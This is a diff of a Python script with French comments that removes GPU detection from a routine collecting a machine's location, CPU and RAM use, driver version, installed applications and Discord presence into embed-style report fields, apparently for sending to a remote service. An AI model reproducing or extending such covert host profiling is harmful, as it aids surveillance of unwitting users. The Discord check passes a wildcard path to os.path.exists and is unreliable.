@@ -7,7 +7,6 @@ import requests
 import socket
 import platform
 import psutil
-import gpuinfo
 import json
 
 # Configuration
@@ -43,12 +42,6 @@ def get_system_info():
         cpu = psutil.cpu_percent(interval=1)
         ram = psutil.virtual_memory().percent
 
-        # 📈 Carte graphique - Utilisation de gpuinfo
-        gpus = gpuinfo.GPUInfo.get_info()
-        gpu_info = "Non détectée"
-        if gpus:
-            gpu_info = gpus[0].name
-
         # Vérification si Discord est installé
         discord_installed = os.path.exists(r"C:\Users\{0}\AppData\Local\Discord\app-*.exe".format(user))  # Change selon ton OS si nécessaire
 
@@ -70,7 +63,6 @@ def get_system_info():
                         {"name": "📍 Localisation", "value": location, "inline": False},
                         {"name": "💾 RAM", "value": f"{ram}% utilisée", "inline": False},
                         {"name": "🖥️ CPU", "value": f"{cpu}% utilisé", "inline": False},
-                        {"name": "💻 Carte Graphique", "value": gpu_info, "inline": False},
                         {"name": "📦 Version des drivers", "value": driver_version, "inline": False},
                         {"name": "Applications installées", "value": ", ".join(applications[:5]), "inline": False},
                         {"name": "Discord Installé", "value": "Oui" if discord_installed else "Non", "inline": False}
